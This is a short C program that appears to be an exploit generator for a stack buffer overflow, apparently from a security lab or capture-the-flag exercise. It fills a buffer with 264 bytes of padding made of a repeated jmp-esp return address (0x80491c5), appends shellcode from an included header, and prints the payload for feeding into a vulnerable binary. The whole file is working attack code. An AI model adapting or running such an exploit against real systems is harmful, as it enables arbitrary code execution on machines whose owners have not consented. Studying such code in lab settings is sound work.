#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "shellcode.h"

#define JMPESPADDR 0x80491c5
#define PADDING 264

int main(int argc, char *argv[]) {
    char *buf, *sc;
    long *addr_ptr;
    int i;
    size_t buf_size;

    sc = shellcode;
    buf_size = PADDING + strlen(sc);

    if ((buf = (char *)malloc(buf_size + 1)) == NULL) {  // Additional byte for final '\0'
        fprintf(stderr, "Failed to allocate memory\n");
        exit(EXIT_FAILURE);
    }

    addr_ptr = (long *)buf;
    for (i = 0; i < buf_size; i += 4) {
        *(addr_ptr++) = JMPESPADDR;
    }

    for (i = 0; i < strlen(sc); i++) {
        buf[PADDING + i] = sc[i];
    }

    buf[buf_size] = '\0';
    printf("%s", buf);

    exit(EXIT_SUCCESS);
}
